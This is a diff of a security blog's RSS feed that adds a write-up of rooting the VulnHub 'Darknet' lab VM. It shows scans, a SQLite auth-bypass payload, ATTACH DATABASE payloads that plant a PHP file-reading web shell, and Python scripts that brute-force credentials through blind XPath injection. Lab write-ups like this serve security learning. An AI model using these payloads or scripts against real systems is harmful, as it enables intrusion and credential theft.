@@ -6,8 +6,920 @@
     <description>Recent content in Vulnerable Vm on #!/slash/note</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 21 Feb 2015 15:55:03 +0000</lastBuildDate>
+    <lastBuildDate>Thu, 16 Jun 2016 21:54:55 +0200</lastBuildDate>
     <atom:link href="https://leonjza.github.io/categories/vulnerable-vm/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>rooting darknet</title>
+      <link>https://leonjza.github.io/blog/2016/06/16/rooting-darknet/</link>
+      <pubDate>Thu, 16 Jun 2016 21:54:55 +0200</pubDate>
+      
+      <guid>https://leonjza.github.io/blog/2016/06/16/rooting-darknet/</guid>
+      <description>
+
+&lt;p&gt;Its been a while since I have done a vulnerable boot2root from &lt;a href=&#34;https://twitter.com/vulnhub&#34;&gt;@VulnHub&lt;/a&gt;. So, I decided to pick up where I last left. After paging back from the latest VM&amp;rsquo;s to where I roughly stopped last year, my attention was drawn to &lt;a href=&#34;https://www.vulnhub.com/entry/darknet-10,120/&#34;&gt;Darknet&lt;/a&gt; by &lt;a href=&#34;https://twitter.com/Q3rv0&#34;&gt;@Q3rv0&lt;/a&gt;.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_logo.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;This is how I managed to solve a VM that totally kicked my ass! While I was solving this VM, I also tried out a Kali Docker image! This actually worked out great.&lt;/p&gt;
+
+&lt;h2 id=&#34;getting-started&#34;&gt;getting started&lt;/h2&gt;
+
+&lt;p&gt;Starting with these VM&amp;rsquo;s is almost always the same story and Darknet was no different. Pick up the VM&amp;rsquo;s IP address (yes, I still use the VMWare network sniffer &lt;code&gt;sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer -e vmnet8&lt;/code&gt;). &lt;strong&gt;192.168.252.140&lt;/strong&gt;. On to the &lt;code&gt;nmap&lt;/code&gt;!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -v --reason 192.168.252.140 -sV
+
+Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-16 20:13 UTC
+
+[...]
+
+Reason: 998 resets
+PORT    STATE SERVICE REASON         VERSION
+80/tcp  open  http    syn-ack ttl 37 Apache httpd 2.2.22 ((Debian))
+111/tcp open  rpcbind syn-ack ttl 37 2-4 (RPC #100000)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Just &lt;code&gt;tcp/80&lt;/code&gt; to work with really. &lt;code&gt;tcp/111&lt;/code&gt; did not yield anything interesting at first glance, but the most obvious next step was definitely the web port.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_homepage.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;888-darknet-com&#34;&gt;888.darknet.com&lt;/h2&gt;
+
+&lt;p&gt;The homepage on the web server I have found so far was not very interesting. I scanned it with &lt;code&gt;gobuster&lt;/code&gt; hoping to discover some more directories which revealed the existence of an &lt;code&gt;/access&lt;/code&gt; folder.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# gobuster -u http://192.168.252.140/ -w /usr/share/wordlists/wfuzz/general/common.txt
+
+Gobuster v1.1                OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://192.168.252.140/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/wfuzz/general/common.txt
+[+] Status codes : 200,204,301,302,307
+=====================================================
+/access (Status: 301)
+/index (Status: 200)
+=====================================================
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Browsing to &lt;a href=&#34;http://192.168.252.140/access/&#34;&gt;http://192.168.252.140/access/&lt;/a&gt; showed that directory indexing was enabled and revealed the &lt;code&gt;888.darknet.com.backup&lt;/code&gt; file.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_access_folder.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Downloading and inspecting the file, it quickly became apparent that this looked like an &lt;a href=&#34;https://httpd.apache.org/docs/current/vhosts/examples.html&#34;&gt;Apache Virtual Host&lt;/a&gt; configuration.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# cat 888.darknet.com.backup
+&amp;lt;VirtualHost *:80&amp;gt;
+    ServerName 888.darknet.com
+    ServerAdmin devnull@darknet.com
+    DocumentRoot /home/devnull/public_html
+    ErrorLog /home/devnull/logs
+&amp;lt;/VirtualHost&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I immediately took this as a hint that I would have to hack an entry into my local &lt;code&gt;/etc/hosts&lt;/code&gt; to resolve &lt;em&gt;888.darknet.com&lt;/em&gt; to &lt;em&gt;192.168.252.140&lt;/em&gt;. After having done that, we are presented with yet another page with a login.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_login.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;888-authentication-bypass&#34;&gt;888 authentication bypass&lt;/h2&gt;
+
+&lt;p&gt;Natural instinct has it that when you see login pages like these, you just throw some single quotes at the fields to see what happens. I did exactly this and was pleasantly met with an error response along the lines of &lt;code&gt;unrecognized token: &amp;quot;3590cb8af0bbb9e78c343b52b93773c9&amp;quot;&lt;/code&gt;. This just &lt;strong&gt;screamed&lt;/strong&gt; SQL injection! I figured since it seems to be reflecting errors back at the page, &lt;code&gt;sqlmap&lt;/code&gt; might just quickly sort out this stage for us without much effort. &lt;strong&gt;Nope!&lt;/strong&gt; After quite a bit of time, I learnt that the SQL injection only appears to be in the &lt;code&gt;username&lt;/code&gt; field, but no matter how I tried to get &lt;code&gt;sqlmap&lt;/code&gt; to play along, I was inevitably met with &lt;code&gt;[WARNING] POST parameter &#39;username&#39; is not injectable&lt;/code&gt; every time.&lt;/p&gt;
+
+&lt;p&gt;Admitting defeat, I figured I should stop being lazy and attempt the injection manually. The fact that the error message returned &lt;code&gt;unrecognized token&lt;/code&gt; hinted towards the fact that the backend database might be SQLite. This gives me a frame of reference for the SQL dialect to use. Next, the most critical step for the injection to be successful was to try and envision what the query must look like in the backend. I played around quite a bit more, and got he most information out of the error message when I have the value &lt;code&gt;&#39;&amp;quot;1&lt;/code&gt; as a username and any text as a password.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_login_error.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Great. So with &lt;code&gt;&amp;quot;&amp;quot;1&#39; and pass=&#39;03c7c0ace395d80182db07ae2c30f034&#39;&amp;quot;&lt;/code&gt; as the error message, I theorized that the SQL query might be something along the lines of:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;SELECT * FROM users WHERE user=&#39;&amp;lt;INJECT&amp;gt;&#39; and pass=&#39;&amp;lt;MD5 OF PASS&amp;gt;&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In the softwares logic then, there may be a requirement to just have a row return to mark the session as logged in. Makes sense right? :) So, in order to attempt an authentication bypass, I will need to try and get the query manipulated in such a way that the query will return a valid row regardless of the password. In SQL, we can have something like &lt;code&gt;SELECT 1&lt;/code&gt; which will just return &lt;code&gt;1&lt;/code&gt; in the row set.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# sqlite3
+SQLite version 3.8.10.2 2015-05-20 18:17:19
+Enter &amp;quot;.help&amp;quot; for usage hints.
+Connected to a transient in-memory database.
+Use &amp;quot;.open FILENAME&amp;quot; to reopen on a persistent database.
+sqlite&amp;gt; SELECT 1;
+1
+sqlite&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With this knowledge, we can imagine that we could have the final query the software will execute look something like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;SELECT * FROM users WHERE user=&#39;a user&#39; or &#39;1&#39; and pass=&#39;&amp;lt;MD5 OF PASS&amp;gt;&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In other words, if the injection point is in the &lt;code&gt;user&lt;/code&gt; section, the payload we need to execute may be derived as follows:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;SELECT * FROM users WHERE user=&#39;&lt;/code&gt; &lt;strong&gt;a user&amp;rsquo; or &amp;lsquo;1&lt;/strong&gt; &lt;code&gt;&#39; and pass=&#39;&amp;lt;MD5 OF PASS&#39;&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This obviously begs the requirement to have knowledge of a valid user! Well, remember that Apache Virtual host config file? It mentioned that the server admin is &lt;code&gt;devnull@darknet.com&lt;/code&gt;. Admittedly, this took me a while to get to (and maybe a bit of a cheat :P), but using a username of &lt;code&gt;devnull&lt;/code&gt; will complete the requirements we have to bypass the auth requirement for this page.&lt;/p&gt;
+
+&lt;p&gt;Considering the injection point and theorized query, we can use a username of &lt;code&gt;devnull&#39; or 1&#39;&lt;/code&gt; and any password to login.&lt;/p&gt;
+
+&lt;h2 id=&#34;administrator-sql-shell&#34;&gt;administrator sql shell&lt;/h2&gt;
+
+&lt;p&gt;After login bypass I was presented with page titled &lt;strong&gt;Administrador SQL&lt;/strong&gt;.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_administrator_sql.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I tried a few queries but quickly realized that no output was returned no matter what you gave it.&lt;/p&gt;
+
+&lt;p&gt;While researching some of the possibilities with SQLite injection, I came across &lt;a href=&#34;http://gwae.trollab.org/sqlite-injection.html&#34;&gt;this&lt;/a&gt; blogpost that details a method of writing arbitrary code to a file of our choosing (obviously assuming we have write access there). Considering I had a fictitious &lt;em&gt;SQL shell&lt;/em&gt; now, I jumped right into trying this.&lt;/p&gt;
+
+&lt;p&gt;My first target was finding a writable directory. The blogpost mentions that &lt;code&gt;uploads/&lt;/code&gt; and &lt;code&gt;cache/&lt;/code&gt; are usually good candidates (and rightfully so), but it did not seem like the paths existed at &lt;a href=&#34;http://888.darknet.com/uploads/&#34;&gt;http://888.darknet.com/uploads/&lt;/a&gt; and &lt;a href=&#34;http://888.darknet.com/cache/&#34;&gt;http://888.darknet.com/cache/&lt;/a&gt;. So I pulled up &lt;code&gt;gobuster&lt;/code&gt; again to see if there are any other directories I could potentially use for this.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# gobuster -u http://888.darknet.com/ -w /usr/share/wordlists/wfuzz/general/common.txt
+
+Gobuster v1.1                OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://888.darknet.com/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/wfuzz/general/common.txt
+[+] Status codes : 302,307,200,204,301
+=====================================================
+/css (Status: 301)
+/img (Status: 301)
+/includes (Status: 301)
+=====================================================
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;3 hits for &lt;code&gt;/css&lt;/code&gt;, &lt;code&gt;/img&lt;/code&gt; and &lt;code&gt;/includes&lt;/code&gt;. Considering I had the VirtualHost configuration file, I also knew that these paths are most probably relative to the DocumentRoot at &lt;code&gt;/home/devnull/public_html&lt;/code&gt;. Now, all I had to do was modify the payload as explained in the blogpost and cross my fingers. Without boring you with the nitty gritty details, I finally managed to figure out that I can write to the &lt;code&gt;/img&lt;/code&gt; directory and gain some code execution.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ATTACH DATABASE &#39;/home/devnull/public_html/img/phpinfo.php&#39; as pwn;
+CREATE TABLE pwn.shell (code TEXT);
+INSERT INTO pwn.shell (code) VALUES (&#39;&amp;lt;?php phpinfo(); ?&amp;gt;&#39;);
+&lt;/code&gt;&lt;/pre&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_phpinfo.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Yeah&amp;hellip; look at that. The amount of &lt;code&gt;disable_functions&lt;/code&gt; values explain why my initial &lt;code&gt;system()&lt;/code&gt; type PHP shells were failing. Nonetheless, I was still able to browse the filesystem with a very rudementary script injected using the SQL shell I still had. The payload was as follows that allowed me to browse around and cat things.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ATTACH DATABASE &#39;/home/devnull/public_html/img/files.php&#39; as pwn;
+CREATE TABLE pwn.shell (code TEXT);
+INSERT INTO pwn.shell (code) VALUES (&amp;quot;&amp;lt;?php if($_GET[&#39;a&#39;] == &#39;ls&#39;) { print_r(scandir($_GET[&#39;p&#39;])); } if($_GET[&#39;a&#39;] == &#39;cat&#39;) { print_r(readfile($_GET[&#39;p&#39;])); } ?&amp;gt;&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looking at the &lt;code&gt;phpinfo()&lt;/code&gt; output, I also noticed the &lt;code&gt;open_basedir&lt;/code&gt; value was set to &lt;code&gt;/etc/apache2:/home/devnull:/tmp&lt;/code&gt;. This is kinda what motivated me to slap together that quick file browsing script so that I can see whats so interesting in &lt;code&gt;/etc/apache2&lt;/code&gt; (especially since we already had this one vhost config requirement to get to this stage).&lt;/p&gt;
+
+&lt;p&gt;Lastly, I also learnt that we are currently the &lt;code&gt;devnull&lt;/code&gt; user on a Debian Linux box&amp;hellip; Weird. I expected something like &lt;code&gt;www-data&lt;/code&gt; but ok.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_id.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Getting back to the &lt;code&gt;/etc/apache2&lt;/code&gt; thing, I found another VirtualHost configuration file there in &lt;code&gt;/etc/apache2/sites-available/&lt;/code&gt;. This was done using the &lt;code&gt;files.php&lt;/code&gt; script I wrote and toggling the &lt;code&gt;a&lt;/code&gt; parameter to &lt;code&gt;ls&lt;/code&gt; or &lt;code&gt;cat&lt;/code&gt; as needed. I was not able to find anything else interesting thanks to that epic &lt;code&gt;open_basedir&lt;/code&gt; setting :/&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_signal8.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;signal8-so-much-hate&#34;&gt;signal8. so much hate.&lt;/h2&gt;
+
+&lt;p&gt;I added another entry to my &lt;code&gt;/etc/hosts&lt;/code&gt; and browsed to the new hostname discovered in that configuration file.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_home.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Poking around with the new website had a few points of interest but nothing that had any obvious bugs. The URL &lt;a href=&#34;http://signal8.darknet.com/contact.php?id=1&#34;&gt;http://signal8.darknet.com/contact.php?id=1&lt;/a&gt; had something funny going on with the &lt;code&gt;id&lt;/code&gt; field though I could not confirm if this was another SQL injection bug or not. A &lt;code&gt;robots.txt&lt;/code&gt; also existed for this site and had the entry &lt;code&gt;Disallow: /xpanel/&lt;/code&gt;. Browsing to this I was met with a login page.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;The login page too did not seem to have any obvious bugs. Some quick scans with &lt;code&gt;nikto&lt;/code&gt;, &lt;code&gt;sqlmap&lt;/code&gt; etc did not show me anything I did not already know.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;fast forward many many hours&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Eventually, I resorted to fuzzing all of the fields in the new site that I have found. I literally tested all of them, but again let me not bore you with the failed attempts ;) I will however explain the general strategy.&lt;/p&gt;
+
+&lt;p&gt;I fired up BurpSuite, captured the request to &lt;a href=&#34;http://signal8.darknet.com/contact.php?id=1&#34;&gt;http://signal8.darknet.com/contact.php?id=1&lt;/a&gt; and sent it to Intruder.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_fuzzing.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Intruder was configured to use a simple fuzzing wordlist sourced from &lt;code&gt;/usr/share/wordlists/wfuzz/Injections/All_attack.txt&lt;/code&gt;. Once the attack finished running, I went to the results and sorted them by response size. It was possible to quickly see those that returned an email address in the body and those that didn&amp;rsquo;t based purely on the size. Using this list, I was able to filter out and realize that the payload of &lt;code&gt;count(/child::node())&lt;/code&gt; managed to return a valid result.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpath_discovery.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;The first time I saw this I had no idea how much time I would be spending on this particular bug. In fact, I have never come across this before so this was &lt;strong&gt;by far&lt;/strong&gt; the most educational portion of the challenge for me!&lt;/p&gt;
+
+&lt;h2 id=&#34;xpath-injection&#34;&gt;xpath injection&lt;/h2&gt;
+
+&lt;p&gt;Just googling the term &lt;em&gt;count(/child::node())&lt;/em&gt; quickly revealed that this was something that related to XPath. XPath allows you to query XML datasets much like SQL can query databases. Ok great. Next up was a trip to owasp.org and their article on &lt;a href=&#34;https://www.owasp.org/index.php/XPATH_Injection&#34;&gt;XPATH Injection&lt;/a&gt;. I spent quite a bit of time researching this type of vulnerability. I realized that the case I was dealing with here was blind XPath injection. Much like blind SQL injection, blind XPath injection can also be exploited by running &amp;lsquo;queries&amp;rsquo; that return true/false. The condition for true in this case was the fact that the email address appeared, and false was that it was missing from the response.&lt;/p&gt;
+
+&lt;p&gt;By far, &lt;a href=&#34;http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blind%20Xpath%20injection.pdf&#34;&gt;this&lt;/a&gt; PDF was the most useful in getting me to understand the vulnerability in the most depth.&lt;/p&gt;
+
+&lt;p&gt;Before I could exploit this bug though, I had to come up with a way to test the theories that I was reading about locally. To do this, I copied some XML that I found in one of the articles to start.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
+&amp;lt;Employees&amp;gt;
+   &amp;lt;Employee ID=&amp;quot;1&amp;quot;&amp;gt;
+      &amp;lt;FirstName&amp;gt;Arnold&amp;lt;/FirstName&amp;gt;
+      &amp;lt;LastName&amp;gt;Baker&amp;lt;/LastName&amp;gt;
+      &amp;lt;UserName&amp;gt;ABaker&amp;lt;/UserName&amp;gt;
+      &amp;lt;Password&amp;gt;SoSecret&amp;lt;/Password&amp;gt;
+      &amp;lt;Type&amp;gt;Admin&amp;lt;/Type&amp;gt;
+   &amp;lt;/Employee&amp;gt;
+   &amp;lt;Employee ID=&amp;quot;2&amp;quot;&amp;gt;
+      &amp;lt;FirstName&amp;gt;Peter&amp;lt;/FirstName&amp;gt;
+      &amp;lt;LastName&amp;gt;Pan&amp;lt;/LastName&amp;gt;
+      &amp;lt;UserName&amp;gt;PPan&amp;lt;/UserName&amp;gt;
+      &amp;lt;Password&amp;gt;NotTelling&amp;lt;/Password&amp;gt;
+      &amp;lt;Type&amp;gt;User&amp;lt;/Type&amp;gt;
+   &amp;lt;/Employee&amp;gt;
+&amp;lt;/Employees&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then wrote a small PHP script that would allow me to test payloads as if it were injected into the XML on the site I have with the bug. This script looked as follows:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+
+// Get the argument from the cli
+$id = $argv[1];
+$xpath = &#39;//Employee[@ID=&#39; . $id . &#39;]/UserName&#39;;
+
+// Be a little verbose about what the query will look like
+print &#39;Injection    : &#39; . $id . PHP_EOL;
+print &#39;Xpath        : &#39; . $xpath . PHP_EOL;
+$xml = simplexml_load_file(&#39;test.xml&#39;);
+print PHP_EOL;
+
+// Run the XPath
+$result = $xml-&amp;gt;xpath($xpath);
+
+// Return a result of the XPath was valid etc.
+print &#39;Blind:&#39; . PHP_EOL;
+@print_r((string)$result[0]);
+
+print PHP_EOL . PHP_EOL;
+
+// Show the raw result of the XPath not filtered
+print &#39;Raw:&#39; . PHP_EOL;
+print_r($result);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I studied some XPath functions available on &lt;a href=&#34;http://devdocs.io/xslt_xpath-xpath-functions/&#34;&gt;devdocs.io&lt;/a&gt;. This reference together with what I read online as well as my small test scenario helped me figure that I could make use of the &lt;a href=&#34;http://devdocs.io/xslt_xpath/xpath/functions/starts-with&#34;&gt;starts-with()&lt;/a&gt; XPath function. This proved to work in my little test environment.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# php readxml.php &amp;quot;1 and starts-with(name(*[1]),&#39;F&#39;)=1&amp;quot;
+Injection    : 1 and starts-with(name(*[1]),&#39;F&#39;)=1
+Xpath        : //Employee[@ID=1 and starts-with(name(*[1]),&#39;F&#39;)=1]/UserName
+
+Blind:
+ABaker
+
+Raw:
+Array
+(
+    [0] =&amp;gt; SimpleXMLElement Object
+        (
+            [0] =&amp;gt; ABaker
+        )
+
+)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To test this scenario on Darknet, I took a guess at the node name of the field that is being returned as &lt;code&gt;email&lt;/code&gt; considering its an email address that is being returned. It is possible to brute force these names as you will see later.
+To start testing the feasibility of the blind boolean based injection, I entered the payload &lt;code&gt;1 and starts-with(email, &#39;e&#39;)&lt;/code&gt; into the URL.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpath_booltest.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Boom. The email address is returned! This meant that I could run over a large key space and brute force other parts of the underlying XML, hoping to learn more of its structure. For clarities sake, the &lt;code&gt;starts-with()&lt;/code&gt; function will later be expanded to be something like &lt;code&gt;1 and starts-with(email, &#39;errorlevel&#39;)&lt;/code&gt;. Using the payload &lt;code&gt;2 and starts-with(email, &#39;d&#39;)&lt;/code&gt; will also return the &lt;code&gt;devnull@darknet.com&lt;/code&gt; email address as that email starts with &lt;code&gt;d&lt;/code&gt; which makes the XPath query true.&lt;/p&gt;
+
+&lt;p&gt;I was not going to test all of these characters by hand, nope. I had to figure out what this XML looks like, so I wrote some scripts to help with that. The first script attempts to brute force the names of the current node as well as the parent node. If we have these names we can call them in an XPath query by name. For eg, &lt;code&gt;//parent/current/attribute&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;import requests
+import string
+import sys
+
+entry_point = &#39;http://signal8.darknet.com/contact.php&#39;
+
+payloads = {
+    # . == current node and .. == parent node
+    &#39;CurrentNode&#39;: &#39;1 and starts-with(name(.),&amp;quot;{exfil}&amp;quot;)=1&#39;,
+    &#39;ParentNode&#39;: &#39;1 and starts-with(name(..),&amp;quot;{exfil}&amp;quot;)=1&#39;,
+}
+
+
+def w(t):
+    sys.stdout.write(t)
+    sys.stdout.flush()
+
+
+for payload_type, payload in payloads.iteritems():
+
+    w(&amp;quot;\n{}: &amp;quot;.format(payload_type))
+
+    stop = False
+    exfil = &#39;&#39;
+    while not stop:
+
+        stop = True
+
+        for char in string.printable:
+            r = requests.get(
+                entry_point, params={
+                    &#39;id&#39;: payload.format(exfil=(exfil + char))
+                })
+            if &#39;darknet.com&#39; in r.text:
+                exfil += char
+                w(char)
+                stop = False
+
+print &amp;quot;\nDone&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The script in action, determining that the XML has the structure &lt;code&gt;//auth/user&lt;/code&gt;:
+&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/ckyep1yvit8jxfo5fqbfxzn3u.js&#34; id=&#34;asciicast-ckyep1yvit8jxfo5fqbfxzn3u&#34; async&gt;&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;I was now able to theorize that the XML may have the following structure when calling user information. &lt;code&gt;//auth/user[@id=1]/email&lt;/code&gt; where &lt;code&gt;1&lt;/code&gt; is the ID of the user in question. I knew about the &lt;code&gt;email&lt;/code&gt; field as it was &lt;em&gt;almost&lt;/em&gt; obvious. I also discovered the &lt;code&gt;username&lt;/code&gt; field by guessing. I tried to apply the same brute force logic as I did to the values, but for some reason I was not getting any luck with payloads where I was trying to address attributes by position, such as with &lt;code&gt;[*1]&lt;/code&gt; for the first. This did work in my local test environment but not on Darknet. I had everything I needed to get the credentials for login (I think?), but did not have the passwords.&lt;/p&gt;
+
+&lt;p&gt;Eventually I wrote another script to take some words from a wordlist and brute the attribute names, hoping to discover some more attributes!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;import requests
+import string
+import sys
+
+entry_point = &#39;http://signal8.darknet.com/contact.php&#39;
+
+payload = &#39;1 and starts-with(name(//auth/user[id=1]/{word}),&amp;quot;{word}&amp;quot;)=1&#39;
+with open(&#39;/usr/share/wfuzz/wordlist/general/spanish.txt&#39;) as f:
+    for word in f.readlines():
+        word = word.strip()
+        r = requests.get(entry_point, params={&#39;id&#39;: payload.format(word=word)})
+        if &#39;darknet.com&#39; in r.text:
+            print &#39;Found attribute: {word}&#39;.format(word=word)
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Having noticed a large part of the sites have been in Spanish, I eventually used a Spanish wordlist and found the field name &lt;code&gt;clave&lt;/code&gt; with it. Urgh, that was mildly frustrating. Anyways, this script in action:
+&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/4fsl2fzb45yhpxxmr6ycwjpfe.js&#34; id=&#34;asciicast-4fsl2fzb45yhpxxmr6ycwjpfe&#34; async&gt;&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;Finally. &lt;code&gt;username&lt;/code&gt; &amp;amp; &lt;code&gt;clave&lt;/code&gt;! As the final piece to this puzzle, I took the original script used to brute force the XML structure and modified the payloads to now brute the values for &lt;code&gt;username&lt;/code&gt; and &lt;code&gt;clave&lt;/code&gt;! The new payloads were:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&#39;username&#39;: &#39;1 and starts-with((//auth/user[id=1]/username),&amp;quot;{exfil}&amp;quot;)=1&#39;,
+&#39;password&#39;: &#39;1 and starts-with((//auth/user[id=1]/clave),&amp;quot;{exfil}&amp;quot;)=1&#39;,
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The brute force script in action with the new payloads:
+&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/4obby2xqro3xo8gomfwh427mu.js&#34; id=&#34;asciicast-4obby2xqro3xo8gomfwh427mu&#34; async&gt;&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;So the username and password combination that lets you login at &lt;a href=&#34;http://signal8.darknet.com/xpanel/&#34;&gt;http://signal8.darknet.com/xpanel/&lt;/a&gt; is &lt;code&gt;errorlevel&lt;/code&gt; / &lt;code&gt;tc65Igkq6DF&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h1 id=&#34;the-ploy&#34;&gt;the ploy&lt;/h1&gt;
+
+&lt;p&gt;Once you have logged in, you presented with a page with a login to &lt;em&gt;Editor PHP&lt;/em&gt;.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_loggedin.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;The link to &lt;code&gt;edit.php&lt;/code&gt; had little value as it simply appeared to be a &amp;lsquo;troll&amp;rsquo; page. I guess the humor here is the fact that code/os command execution has been relatively painful and this may have been a sign of hope.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_troll_edit.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;When I viewed the page sources for the page I got when I just logged it, I saw a hint to a &lt;code&gt;ploy.php&lt;/code&gt; page.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_ploy.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Browsing to &lt;code&gt;ploy.php&lt;/code&gt;, I was met with a file upload and a series of checkboxes to tick.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_ploy_upload.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
